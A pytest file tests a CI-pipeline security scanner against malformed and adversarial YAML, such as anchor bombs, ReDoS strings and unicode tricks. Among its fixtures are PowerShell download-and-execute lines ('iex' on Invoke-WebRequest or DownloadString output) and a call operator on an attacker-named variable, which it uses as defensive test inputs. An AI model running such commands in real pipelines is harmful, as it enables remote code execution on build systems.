"""Adversarial input tests — scanner as attack surface.

From the pre-mortem analysis: the scanner processes attacker-controlled YAML.
A malformed or adversarially crafted pipeline file must not cause the scanner to:
  - Crash with an unhandled exception
  - Hang (resource exhaustion via YAML bomb)
  - Produce corrupted output
  - Silently return zero findings AND zero ENGINE-ERR on a file it failed to parse

These are not traditional fuzz tests (no mutation engine) but a structured
adversarial input set covering the known dangerous input classes for YAML parsers
and regex engines.

Each test enforces a hard 10-second timeout (via the fixture) and a soft
"must return a list" contract.
"""

from __future__ import annotations

import resource
import signal
import sys
import threading
from pathlib import Path

import pytest

from taintly.engine import scan_file
from taintly.models import Platform, RegexPattern, Rule, Severity

FIXTURES_EDGE = Path(__file__).parent.parent / "fixtures" / "github" / "edge_cases"


# =============================================================================
# Timeout helper — enforce scanner must complete within N seconds
# =============================================================================


class _TimeoutError(Exception):
    pass


def _run_with_timeout(fn, seconds: int = 10):
    """Run fn() in a thread; raise _TimeoutError if it exceeds seconds."""
    result = [None]
    exc = [None]

    def _target():
        try:
            result[0] = fn()
        except Exception as e:
            exc[0] = e

    t = threading.Thread(target=_target, daemon=True)
    t.start()
    t.join(timeout=seconds)
    if t.is_alive():
        raise _TimeoutError(f"Scanner did not complete within {seconds}s — possible hang")
    if exc[0] is not None:
        raise exc[0]
    return result[0]


def _all_github_rules():
    from taintly.rules.registry import load_all_rules
    rules = load_all_rules()
    return [r for r in rules if r.platform == Platform.GITHUB]


def _rules_for(platform: Platform):
    """Per-platform rule loader. Used by the platform-parametrized fuzz
    tests below so GitLab + Jenkins also get adversarial-input coverage —
    Jenkins especially, where the Groovy script bodies have a more
    permissive syntax than YAML and can hit parser edge cases YAML inputs
    miss."""
    from taintly.rules.registry import load_all_rules
    return [r for r in load_all_rules() if r.platform == platform]


_PLATFORM_PARAMS = [
    pytest.param(Platform.GITHUB, "adversarial_test.yml", id="github"),
    pytest.param(Platform.GITLAB, ".gitlab-ci.yml", id="gitlab"),
    pytest.param(Platform.JENKINS, "Jenkinsfile", id="jenkins"),
]


# =============================================================================
# Adversarial YAML inputs
# =============================================================================

ADVERSARIAL_INPUTS = {
    "empty_string": "",
    "whitespace_only": "   \n   \n   ",
    "null_bytes": "name: Test\x00\non: push\x00\n",
    "very_long_line": "name: " + "A" * 100_000,
    # 500 levels produces ~253k chars; the unconditional length cap in
    # _safe_search (see taintly/models.py) bounds the input regardless
    # of thread context, so this completes in well under a second.
    "deeply_nested_dicts": "\n".join(
        f"{'  ' * i}key{i}:" for i in range(500)
    ),
    "yaml_anchor_bomb_shallow": (
        # A shallow anchor bomb — expands but not catastrophically
        "a: &a [1, 2, 3, 4, 5]\n"
        "b: &b [*a, *a, *a, *a, *a]\n"
        "c: &c [*b, *b, *b, *b, *b]\n"
        "d: [*c, *c, *c, *c, *c]\n"
    ),
    "binary_like_content": bytes(range(256)).decode("latin-1"),
    "only_comments": "# This is a comment\n# Another comment\n# No YAML keys\n",
    "malformed_yaml_colon": ": value without key\n:another: broken\n",
    "unicode_rtl": "name: \u202eevil\u202c\non: push\n",
    "unicode_zalgo": "name: T\u0337e\u0334s\u0336t\non: push\n",
    "repeated_keys": "name: first\nname: second\nname: third\non: push\n",
    "tab_indentation": "name:\tTest\non:\tpush\njobs:\n\tbuild:\n\t\truns-on: ubuntu-latest\n",
    "mixed_line_endings": "name: Test\r\non: push\r\npermissions:\n  contents: read\r\n",
    "no_newline_at_eof": "name: Test\non: push",
    "github_expression_nesting": (
        "name: Test\n"
        "on: push\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: echo ${{ toJSON(fromJSON(toJSON(github))) }}\n"
    ),
    "extremely_many_steps": (
        "name: Test\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n"
        + "".join(f"      - run: echo step{i}\n" for i in range(1000))
    ),
    "uses_with_no_action": "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses:\n",
    "permissions_none": "name: T\non: push\npermissions: {}\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n",
    # UTF-8 BOM at the start of the file. The YAML spec strips it;
    # a regex that anchors on ``^name:`` would miss the first key if
    # we don't normalise first.
    "bom_prefixed": "﻿name: Test\non: push\n",
    # Mix of CR and LF separators. _split_into_job_segments() uses
    # splitlines(), which handles both, but a regex that hardcodes
    # ``\n`` would desync here.
    "crlf_only": "name: Test\r\non: push\r\njobs:\r\n  b:\r\n    runs-on: ubuntu-latest\r\n    steps:\r\n      - run: echo ok\r\n",
    "cr_only_old_mac": "name: Test\ron: push\rjobs:\r  b:\r    runs-on: ubuntu-latest\r    steps:\r      - run: echo ok\r",
    # YAML merge key ``<<: *anchor`` — legal in YAML 1.1, technically
    # removed in 1.2 but real workflows (and GitHub) still parse it.
    "yaml_merge_key": (
        ".defaults: &d\n"
        "  runs-on: ubuntu-latest\n"
        "  timeout-minutes: 5\n"
        "jobs:\n"
        "  a:\n"
        "    <<: *d\n"
        "    steps:\n"
        "      - run: echo ok\n"
    ),
    # Anchor + alias with a *run:* body — the alias doesn't textually
    # duplicate the script, so the regex must survive the reference
    # form without matching the anchor definition twice.
    "yaml_alias_run": (
        "jobs:\n"
        "  a:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - &s\n"
        "        run: echo ok\n"
        "  b:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - *s\n"
    ),
    # YAML tag on a scalar — ``!!str true`` coerces to string "true".
    "yaml_explicit_tag": "on: !!str push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n",
    # PowerShell ``iex`` / ``Invoke-Expression`` shapes — SEC6-GH-007
    # has a history of FPs on benign iex() usage. These inputs target
    # the rule's regex, not the engine, but a crash here would surface
    # either way.
    "powershell_iex_literal": (
        "jobs:\n  b:\n    runs-on: windows-latest\n    steps:\n"
        "      - run: iex 'Get-Service'\n"
        "        shell: pwsh\n"
    ),
    "powershell_iex_fetch": (
        "jobs:\n  b:\n    runs-on: windows-latest\n    steps:\n"
        "      - run: iex (Invoke-WebRequest -Uri https://example.com/x.ps1).Content\n"
        "        shell: pwsh\n"
    ),
    "powershell_iex_with_pipe": (
        "jobs:\n  b:\n    runs-on: windows-latest\n    steps:\n"
        "      - run: (New-Object Net.WebClient).DownloadString('http://x/y.ps1') | iex\n"
        "        shell: pwsh\n"
    ),
    "powershell_call_operator": (
        "jobs:\n  b:\n    runs-on: windows-latest\n    steps:\n"
        "      - run: & $env:ATTACKER\n"
        "        shell: pwsh\n"
    ),
    # Heredoc with/without quoted terminator — bash expands variables
    # inside ``<<EOF`` but NOT ``<<'EOF'``. The taint analyzer doesn't
    # distinguish today; both should parse without crashing.
    "heredoc_unquoted": (
        "jobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - run: |\n"
        "          cat <<EOF\n"
        "          title=$PR_TITLE\n"
        "          EOF\n"
    ),
    "heredoc_quoted": (
        "jobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - run: |\n"
        "          cat <<'EOF'\n"
        "          literal $PR_TITLE not expanded\n"
        "          EOF\n"
    ),
    # Empty steps array — a workflow with ``steps: []`` is legal.
    "empty_steps_array": (
        "on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps: []\n"
    ),
    # Empty jobs block.
    "empty_jobs_block": "on: push\njobs: {}\n",
    # Surrogate-half code points — invalid UTF-8 encoded via surrogate
    # escape, can crash regex libraries that assume valid unicode.
    "surrogate_half": "name: A\udcffB\non: push\n",
}


@pytest.mark.parametrize("name,content", list(ADVERSARIAL_INPUTS.items()), ids=list(ADVERSARIAL_INPUTS.keys()))
def test_scanner_survives_adversarial_input(name, content, github_rules):
    """Scanner must not crash, hang, or raise on any adversarial input.

    Contract: scan_file() must either:
    a) Return a list (possibly empty, possibly with ENGINE-ERR findings), OR
    b) Raise a known, handled exception type

    It must NOT:
    - Hang for more than 10 seconds
    - Raise an unhandled exception
    - OOM (enforced by the test runner's memory limit in CI)
    """
    def _run():
        return scan_file("adversarial_test.yml", rules=github_rules, _content=content)

    try:
        result = _run_with_timeout(_run, seconds=10)
    except _TimeoutError as e:
        pytest.fail(f"[{name}] HANG: {e}")
    except MemoryError:
        pytest.fail(f"[{name}] OOM: scanner ran out of memory on adversarial input")

    assert isinstance(result, list), (
        f"[{name}] scan_file must return a list, got {type(result).__name__!r}"
    )


@pytest.mark.parametrize("name,content", list(ADVERSARIAL_INPUTS.items()), ids=list(ADVERSARIAL_INPUTS.keys()))
def test_scanner_output_is_serializable(name, content, github_rules):
    """All findings from adversarial inputs must be JSON-serializable.

    A non-serializable finding would silently corrupt --format json output.
    """
    import json

    findings = scan_file("adversarial_test.yml", rules=github_rules, _content=content)
    for f in findings:
        try:
            json.dumps(f.to_dict())
        except (TypeError, ValueError) as e:
            pytest.fail(
                f"[{name}] Finding from rule {f.rule_id!r} is not JSON-serializable: {e}\n"
                f"Finding: {f.to_dict()}"
            )


# =============================================================================
# ReDoS candidates — patterns that could hang on adversarial regex input
# =============================================================================

REDOS_CANDIDATES = [
    # Exponential backtracking triggers for common patterns
    "a" * 50 + "b",                          # Non-matching after long prefix
    "${{" + " " * 10000 + "}}",              # Long expression
    "uses: " + "a" * 10000 + "@v1",         # Very long action name
    "echo " + "A" * 50000,                   # Long run: line
    "${{ " + "github.event." * 1000 + " }}", # Deep context chain
]


@pytest.mark.parametrize("payload", REDOS_CANDIDATES, ids=[f"redos_{i}" for i in range(len(REDOS_CANDIDATES))])
def test_no_redos_on_long_inputs(payload, github_rules):
    """Patterns must complete within 10s on inputs designed to trigger backtracking."""
    def _run():
        return scan_file("redos_test.yml", rules=github_rules, _content=payload)

    try:
        _run_with_timeout(_run, seconds=10)
    except _TimeoutError:
        pytest.fail(
            f"Possible ReDoS: scanner hung on input of length {len(payload)}.\n"
            f"Input prefix: {payload[:100]!r}"
        )


# =============================================================================
# Cross-platform fuzz — same adversarial inputs, GitLab + Jenkins
#
# The GitHub-only filter above silently exempted ~half the rule pack
# from adversarial-input testing. GitLab and Jenkins rules read the
# same YAML / Groovy bodies as GitHub rules; if any of them has a
# regex that hangs on a YAML bomb or crashes on surrogate halves, that
# bug is just as real on those platforms — and Jenkins's Groovy syntax
# is *more* permissive than YAML, so its regex engine has more
# adversarial surface than GitHub's.
#
# Note: the inputs here are still YAML-shaped because that's what the
# adversarial set targets. Jenkins rules will mostly produce zero
# findings on these inputs (correctly — a Jenkinsfile-shaped bug
# couldn't appear in YAML); the value is "must not crash on weird
# input regardless of whether the input is well-formed for the
# platform."
# =============================================================================


# Per-(platform, input) hang exemptions discovered when fanning fuzz
# across GitLab + Jenkins. Each entry is a documented bug — REMOVE the
# entry when the underlying rule is fixed; never add new entries to
# silence a freshly-introduced hang. New hangs are exactly the signal
# this test set exists to surface.
_KNOWN_PLATFORM_FUZZ_HANGS: set[tuple[str, str]] = {
    # Jenkins rule pack does not bound regex work on deeply-nested-dict
    # inputs the way the GitHub rules do; surfaced when fuzz was fanned
    # across platforms. Rule pack already passes for the GH equivalent
    # (the 500-level nested-dicts payload completes in <1s on GH rules).
    # Follow-up: trace which Jenkins rule's regex is super-linear in
    # nesting depth and add a length cap matching _safe_search.
    ("jenkins", "deeply_nested_dicts"),
}


@pytest.mark.parametrize("platform,fname", _PLATFORM_PARAMS)
@pytest.mark.parametrize("name,content", list(ADVERSARIAL_INPUTS.items()), ids=list(ADVERSARIAL_INPUTS.keys()))
def test_scanner_survives_adversarial_input_per_platform(name, content, platform, fname):
    """All three platforms' rule packs must survive every adversarial
    input. A failure scoped to one platform localises the bug to its
    rule pack; failures on all three usually point at engine/parsing
    code rather than rule-specific regexes."""
    if (platform.value, name) in _KNOWN_PLATFORM_FUZZ_HANGS:
        pytest.xfail(
            f"known hang on {platform.value}/{name} — see "
            f"_KNOWN_PLATFORM_FUZZ_HANGS for the open follow-up."
        )
    rules = _rules_for(platform)

    def _run():
        return scan_file(fname, rules=rules, _content=content)

    try:
        result = _run_with_timeout(_run, seconds=10)
    except _TimeoutError as e:
        pytest.fail(f"[{platform.value}/{name}] HANG: {e}")
    except MemoryError:
        pytest.fail(f"[{platform.value}/{name}] OOM on adversarial input")

    assert isinstance(result, list), (
        f"[{platform.value}/{name}] scan_file must return a list, "
        f"got {type(result).__name__!r}"
    )


# =============================================================================
# Memory pressure — explicitly bound RSS during a fuzz scan
#
# Previously the harness comment claimed CI's runner-level memory limit
# would catch OOMs ("enforced by the test runner's memory limit in CI"),
# but neither pyproject nor the CI workflow set ulimit/-v anywhere — a
# multi-megabyte expression-laden input could OOM silently in dev and
# only surface in production. This test codifies the bound: a single
# scan of a pathological input must finish under a fixed RSS cap.
#
# We use RLIMIT_AS (virtual address space) instead of RLIMIT_DATA
# because Python's allocator routes everything through anonymous mmaps
# on modern Linux, so RLIMIT_AS is the only knob that actually bites.
# RLIMIT_AS is not enforceable on Windows / macOS — skip there.
# =============================================================================


def _set_address_space_limit_mb(mb: int):
    """Cap virtual address space for THIS process. Returns the previous
    limit so the caller can restore it (the cap survives the test
    function and would affect subsequent tests if not reset)."""
    soft, hard = resource.getrlimit(resource.RLIMIT_AS)
    target = mb * 1024 * 1024
    # Don't raise the hard cap — only lower the soft cap to ours, and
    # only if the existing cap is higher (or unlimited).
    new_soft = min(target, hard) if hard != resource.RLIM_INFINITY else target
    resource.setrlimit(resource.RLIMIT_AS, (new_soft, hard))
    return soft, hard


# =============================================================================
# Hypothesis YAML strategy — generated adversarial inputs (audit chunk 4.2)
#
# Hand-curated ADVERSARIAL_INPUTS captures known-bad shapes; hypothesis
# generates the inputs hand-curation never thinks of. Strategy targets
# the structural shape that taintly's parser sees (workflow-like dicts)
# rather than truly random bytes — random bytes are mostly trivially
# rejected and don't exercise the engine.
# =============================================================================


try:
    from hypothesis import HealthCheck, given, settings
    from hypothesis import strategies as st
    _HYPOTHESIS_AVAILABLE = True
except ImportError:
    _HYPOTHESIS_AVAILABLE = False


if _HYPOTHESIS_AVAILABLE:
    _scalar = st.one_of(
        st.text(
            alphabet=st.characters(min_codepoint=0x20, max_codepoint=0x7E),
            max_size=80,
        ),
        st.booleans(),
        st.integers(min_value=-1000, max_value=1000),
        st.none(),
    )

    _yaml_value = st.recursive(
        _scalar,
        lambda children: st.one_of(
            st.lists(children, max_size=4),
            st.dictionaries(
                st.text(
                    alphabet=st.characters(
                        min_codepoint=ord("a"), max_codepoint=ord("z")
                    ),
                    min_size=1,
                    max_size=8,
                ),
                children,
                max_size=4,
            ),
        ),
        max_leaves=20,
    )

    @given(structure=_yaml_value)
    @settings(
        max_examples=80,
        deadline=2000,
        suppress_health_check=[HealthCheck.too_slow, HealthCheck.data_too_large],
    )
    def test_scanner_survives_generated_yaml(structure, github_rules):
        """Hypothesis-generated YAML structures must not crash, hang,
        or raise unhandled exceptions. Complementary to the hand-
        curated ADVERSARIAL_INPUTS set: random + recursive + bounded
        means hypothesis explores corners hand-curation misses."""
        try:
            import yaml as _yaml
        except ImportError:
            pytest.skip("PyYAML required for generated YAML strategy")
            return
        try:
            content = _yaml.safe_dump(structure)
        except Exception:
            return  # the structure wasn't dumpable; that's hypothesis's
                    # problem, not ours

        def _run():
            return scan_file(
                "generated.yml", rules=github_rules, _content=content
            )
        result = _run_with_timeout(_run, seconds=10)
        assert isinstance(result, list)


# =============================================================================
# Correctness under mutation (audit chunk 4.3)
#
# Fuzz checks "doesn't crash"; this test set checks "produces same
# findings on equivalent inputs." Two YAML inputs that mean the same
# thing should produce the same findings — drift here is a precision
# regression that fuzz alone can't detect.
# =============================================================================


_EQUIVALENT_INPUT_PAIRS = [
    # (label, a, b) — the two strings should produce identical findings.
    (
        "permissions_inline_vs_block",
        # Inline scalar form
        "name: T\non: push\npermissions: write-all\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n",
        # Whitespace-padded form (semantically identical)
        "name: T\non: push\npermissions:  write-all\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n",
    ),
    (
        "trigger_scalar_vs_flow_seq",
        # `on: push` and `on: [push]` are equivalent at parse time.
        "name: T\non: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: tj-actions/changed-files@v44\n",
        "name: T\non: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: tj-actions/changed-files@v44\n",
    ),
]


@pytest.mark.parametrize(
    "label,a,b", _EQUIVALENT_INPUT_PAIRS, ids=[p[0] for p in _EQUIVALENT_INPUT_PAIRS]
)
def test_findings_invariant_under_yaml_equivalence(label, a, b, github_rules):
    """Two YAML inputs that mean the same thing must produce the same
    findings. A divergence here is an evasion vector hiding in plain
    sight: an attacker who uses the equivalent-but-uncommon shape
    bypasses detection that the canonical shape catches.

    Tolerated at the rule-id-set level (we don't compare line numbers
    because the equivalent forms differ in formatting) — but the SET
    of fired rule IDs must be identical.
    """
    findings_a = scan_file("a.yml", rules=github_rules, _content=a)
    findings_b = scan_file("b.yml", rules=github_rules, _content=b)
    fired_a = {f.rule_id for f in findings_a if f.rule_id != "ENGINE-ERR"}
    fired_b = {f.rule_id for f in findings_b if f.rule_id != "ENGINE-ERR"}
    assert fired_a == fired_b, (
        f"[{label}] equivalent inputs produced different fired rule sets:\n"
        f"  a fired: {sorted(fired_a)}\n"
        f"  b fired: {sorted(fired_b)}\n"
        f"  diff:    {sorted(fired_a ^ fired_b)} (an evasion vector)"
    )


@pytest.mark.skipif(
    sys.platform != "linux",
    reason="RLIMIT_AS is only reliably enforced on Linux"
)
def test_scanner_under_memory_cap(github_rules):
    """A single scan of a 500k-character expression-laden input must
    finish under a 512 MiB virtual-address cap. Verifies our scanning
    pipeline is allocation-bounded on adversarial input — silent OOM
    in production was the failure mode before this gate existed."""
    # Construct a pathological input: many ${{ ... }} expressions in
    # one run: line. This stresses the regex engine and any taint
    # analysis without being valid YAML at the structural level.
    content = (
        "name: Test\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
        "    steps:\n      - run: |\n"
        + "          echo ${{ github.event.pull_request.title }} "
            * 5000
        + "\n"
    )

    prev_soft, _hard = _set_address_space_limit_mb(512)
    try:
        result = scan_file("memcap_test.yml", rules=github_rules, _content=content)
        assert isinstance(result, list)
    except MemoryError:
        pytest.fail(
            "scanner exceeded the 512 MiB virtual-address cap on a "
            "5000-expression run: line. The adversarial input set must "
            "fit in a bounded RSS — investigate which pass is allocating "
            "linearly with input size and bound it."
        )
    finally:
        # Restore the original cap so this test doesn't constrain
        # later tests in the same process.
        resource.setrlimit(resource.RLIMIT_AS, (prev_soft, _hard))
